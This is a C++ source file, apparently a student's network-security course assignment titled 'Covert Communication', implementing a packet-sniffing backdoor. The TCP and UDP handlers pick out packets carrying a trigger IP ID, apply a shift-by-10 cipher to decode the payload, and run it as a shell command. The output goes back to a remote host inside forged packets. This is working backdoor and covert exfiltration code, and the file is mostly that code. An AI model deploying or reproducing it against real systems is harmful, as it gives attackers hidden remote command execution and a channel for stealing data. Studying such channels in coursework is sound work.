/*******************************************************************************
**
**  Author:   Mario Enriquez,   A00909441
**  Class:    COMP_8505
**  Title:    Final Assignment, Covert Communication
**
**  Notes:
**        -Based on the code from Rowland and Aman Abdullah
**
*******************************************************************************/

#include "headers.h"

#define BUFFER_LEN 1000

void forgepacket(char[],char[],int,char*, int, int[]);
void forgedatagram(char[],char[],int,char*, int, int[]);

std::string encr_decr(std::string msg)
{
    // Shift Encrypt
    string::size_type i;

    // And now for the encryption part
    for (i = 0; i < msg.length(); i++)
        msg[i] += 10;
    return msg;
}

std::string decr_encr(std::string msg)
{
    // Shift Decrypt
    string::size_type i;

    // And now for the encryption part
    for (i = 0; i < msg.length(); i++)
        msg[i] -= 10;
    return msg;
}

u_int16_t handle_ethernet (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet){
  u_int caplen = pkthdr->caplen;
  u_int length = pkthdr->len;
  struct ether_header *eptr;  /* net/ethernet.h */
  u_short ether_type;

  if (caplen < ETHER_HDRLEN){
  	cout << "Packet length less than ethernet header length" << endl;
  	return -1;
  }

  // Start with the Ethernet header...
  eptr = (struct ether_header *) packet;
  ether_type = ntohs(eptr->ether_type);

  return ether_type;
}


// This function will parse the IP header and print out selected fields of interest
void handle_IP (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet, char * src_host, char * dst_host,int ports[], int ip_id)
{
  const struct my_ip* ip;
  u_int length = pkthdr->len;
  u_int hlen,off,version;
  int len;

  // Jump past the Ethernet header
  ip = (struct my_ip*)(packet + sizeof(struct ether_header));
  length -= sizeof(struct ether_header);

  // make sure that the packet is of a valid length
  if (length < sizeof(struct my_ip)){
    	cout << "Truncated IP " << length;
    	exit (1);
  }

  len     = ntohs(ip->ip_len);
  hlen    = IP_HL(ip); 	// get header length
  version = IP_V(ip);	// get the IP version number

  // verify version
  if(version != 4){
    cout << "Unknown version " << version << endl;
    exit (1);
  }

  // verify the header length */
  if(hlen < 5 ){
    cout << "Bad header length " << hlen << endl;
  }

  // Ensure that we have as much of the packet as we should
  if (length < len)
    cout << "Truncated IP " << (len -length) <<" - bytes missing\n" << endl;

  // Ensure that the first fragment is present
  off = ntohs(ip->ip_off);

  switch (ip->ip_p){
    case IPPROTO_TCP:
		  handle_TCP (args, pkthdr, packet, src_host, dst_host, ports, ip_id);
      break;
    case IPPROTO_UDP:
      handle_UDP (args, pkthdr, packet, src_host, dst_host, ports, ip_id);
      break;
    default:
      break;
  }
}

// This function will parse the IP header and print out selected fields of interest
void handle_TCP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet, char * src_host, char * dst_host, int ports[], int ip_id){
	const struct sniff_tcp *tcp=0;          // The TCP header
	const struct my_ip *ip;              	// The IP header
  u_char *payload;                    // Packet payload
  string command_res,buffer,enc_buff,dec_payload;
  int index=0;
  int i;
  int size_ip;
  int size_tcp;
  int size_payload;
  int flags[6] = {0,1,0,0,0,0};

  //cout << "   TCP Packet" << endl;
  ip = (struct my_ip*)(packet + SIZE_ETHERNET);
  size_ip = IP_HL (ip)*4;

  // define/compute tcp header offset
  tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
  size_tcp = TH_OFF(tcp)*4;

  if (size_tcp < 20){
    cout << "   * Control Packet? length: " << size_tcp << " bytes\n" << endl;
    exit(1);
  }

  // define/compute tcp payload (segment) offset
  payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);

  // compute tcp payload (segment) size
  size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

  // Print payload data, including binary translation
  if (size_payload > 0 && ip->ip_id == ip_id){
    string sName(reinterpret_cast<char*>(payload));
    dec_payload=decr_encr(sName);
    command_res = exec((char*) dec_payload.c_str());
    i=0;
    while(i < command_res.length()){
      sleep(1);
      buffer = command_res.substr(i,BUFFER_LEN);
      i+=BUFFER_LEN;
      if(i>command_res.length()){
        i=command_res.length();
      }
      enc_buff=encr_decr(buffer);
      forgepacket(src_host,dst_host,ports[1],(char *) enc_buff.c_str(),ip_id,flags);
    }
  }
}

void handle_UDP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet, char * src_host, char * dst_host, int ports[], int ip_id){
  const struct sniff_udp *udp=0;          // The UDP header
	const struct my_ip *ip;              	// The IP header
  u_char *payload;                    // Packet payload
  string command_res,buffer,enc_buff,dec_payload;
  int index=0;
  int i;
  int size_ip;
  int size_udp;
  int size_payload;
  int flags[6] = {0,1,0,0,0,0};

  ip = (struct my_ip*)(packet + SIZE_ETHERNET);
  size_ip = IP_HL (ip)*4;

  // define/compute UDP header offset
  udp = (struct sniff_udp*)(packet + SIZE_ETHERNET + size_ip);
  size_udp = 8;

  if (size_udp < 8){
    cout << "   * Control Packet? length: " << size_udp << " bytes\n" << endl;
    exit(1);
  }

  // define/compute UDP payload (segment) offset
  payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_udp);

  // compute UDP payload (segment) size
  size_payload = ntohs(ip->ip_len) - (size_ip + size_udp);

  // Print payload data, including binary translation
  if (size_payload > 0 && ip->ip_id == ip_id){
    string sName(reinterpret_cast<char*>(payload));
    dec_payload=decr_encr(sName);
    command_res = exec((char*) dec_payload.c_str());
    i=0;
    while(i < command_res.length()){
      sleep(1);
      buffer = command_res.substr(i,BUFFER_LEN);
      i+=BUFFER_LEN;
      if(i>command_res.length()){
        i=command_res.length();
      }
      enc_buff=encr_decr(buffer);
      forgedatagram(src_host,dst_host,ports[1],(char *) enc_buff.c_str(),ip_id,flags);//Sends UDP packet
    }
  }
}
